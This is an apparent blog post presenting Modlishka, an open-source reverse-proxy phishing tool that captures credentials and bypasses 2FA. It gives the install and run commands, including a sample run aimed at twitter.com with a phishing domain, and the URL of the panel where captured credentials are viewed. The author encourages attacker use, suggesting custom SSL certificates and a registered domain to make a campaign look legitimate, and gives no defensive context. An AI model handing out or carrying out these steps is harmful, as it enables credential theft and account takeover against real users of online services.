---
layout: post
title: Modlishka 2FA Phishing Tool
date: 2018-03-15
image: '/images/posts/modlishka.jpg'
categories: ["tools"]
tags: ["tools"]
---

Open Source Phishing Tool With 2FA Authentication

<!--more-->

Modlishka is a really neat tool based on go. It is a phishing proxy that supports 2FA authentication. This is what makes this tool so great.

The tool is simple to configure and allows the attacker to control all traffic from the target's browser.

Let's install and test Modlishka:

<h1> Installing Modlishka </h1>

You will need to download the repo from github with the following command:
```
go get -u github.com/drk1wi/Modlishka
```

Then traverse to the 'go' folder and run the below followed with the make command:

```
cd $GOPATH/go/src/github.com/drk1wi/Modlishka/
```

```
make
```
And that's all.


<h1>Actually Running Modlishka </h1>
To run the proxy go to the 'dist' folder and run the 'proxy' script
```
cd dist/
```
```
./proxy -h
```
<br>
<img src="/modlishkahelp.jpg" alt="ModlishkaHelp">

<br>

As you can see, Modlishka comes with some pretty flashy features. It allows you to create your own SSL certification using openssl which will allow your phishing campaign to look more trustworthy and legitimate. You will likely want to register a domain name to further the false legitimacy.
<br>
It also allows you to bypass some security measures such as anti-SSRF.
Run the command below against a target site to see the proxy in action. The phishingDomain option can be changed to fit you needs. I am using the loopback.modlishka.io which requires you to change the index.html file inside the apache folder (/var/www/).

```
./proxy -target https://twitter.com -phishingDomain local.modlishka.com -listeningPort 80
```
<br>
<img src="/img/modlishkarun.jpg" alt="ModlishkaRun">

<br>

You can then access the control panel to see all the credentials you captured. To do this, visit the below in your browser:
```
http://local.modlishka.com/SayHello2Modlishka/
```
<br>

Below is a shared video demonstrating Modlishka in real-time
<br>
<iframe src="https://player.vimeo.com/video/308709275" width="640" height="360" frameborder="0" allowfullscreen></iframe>


<br>

Thanks for reading!
